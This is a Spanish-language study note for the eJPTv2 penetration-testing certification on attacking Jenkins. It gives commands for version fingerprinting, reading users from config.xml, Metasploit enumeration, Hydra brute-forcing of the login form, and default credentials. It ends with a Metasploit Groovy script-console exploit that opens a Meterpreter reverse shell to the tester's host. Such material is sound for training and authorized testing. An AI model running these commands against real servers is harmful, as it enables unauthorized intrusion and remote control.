---
layout: default
title: Preparación EJPTv2
---

# 🌐 Jenkins

Jenkins es una herramienta de integración continua ampliamente utilizada en entornos de desarrollo y despliegue. Debido a su importancia, es un objetivo común en auditorías de seguridad y pruebas de penetración.

## 🕵️ Identificación de la Versión de Jenkins

Determinar la versión del servidor es clave para detectar posibles vulnerabilidades. Podemos hacerlo de varias maneras:

```bash
nmap -sV --script http-jenkins-enum <url>
```

- Reconocimiento con WhatWeb

```bash
whatweb -v <url> # Muestra detalles de la versión detectada.
```

- Accediendo a la Consola de Jenkins

En muchos casos, la versión de Jenkins se puede encontrar directamente en su consola de administración:

```bash
http://<ip>:8080
```

Si la consola es accesible, la versión suele aparecer en la parte inferior de la interfaz o en la sección "About Jenkins".

💡 Importante: Si el acceso a estos directorios no está restringido, puede representar una vulnerabilidad grave.

## 🔑 Enumeración de Usuarios en Jenkins

Jenkins almacena credenciales en config.xml y en otros archivos dentro de /var/lib/jenkins. Si tenemos acceso, podemos enumerar los usuarios configurados:

```bash
cat /var/lib/jenkins/config.xml | grep '<user>'
```

Si no tenemos acceso directo, podemos intentar un escaneo con Metasploit:

```bash
use auxiliary/scanner/http/jenkins_enum
set RHOSTS <url>
run
```

💡 Explicación:

✔ jenkins_enum → Escanea usuarios y configuraciones expuestas en Jenkins.


Ataque de Fuerza Bruta con Hydra 💥

Si encontramos el panel de login de Jenkins, podemos probar credenciales con Hydra:

```bash
hydra -L <usernames_wordlists.txt> -P <password_wordlist.txt> <url> http-post-form "/j_acegi_security_check: j_username=^USER^&j_password=^PASS^:F=incorrect"
```

💡 Explicación:

✔ -L → Lista de usuarios.

✔ -P → Diccionario de contraseñas.

✔ http-post-form → Método de autenticación de Jenkins.

## Credenciales por defecto de Jenkins:


admin:admin

jenkins:jenkins

admin:password

##  Explotación de Jenkins con Metasploit

Si tenemos acceso a la consola de scripts Groovy, podemos ejecutar código malicioso para obtener acceso remoto.

```bash
use exploit/multi/http/jenkins_script_console
set RHOSTS <url>
set TARGETURI /script
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST <tu_ip>
set LPORT 4444
exploit
```

---

<div style="text-align:center; font-size: 0.9em; margint-top: 40px; color: #33ff33;">
    💻 Hecho con 💚 por <strong>Marcela</strong> - 2025
</div>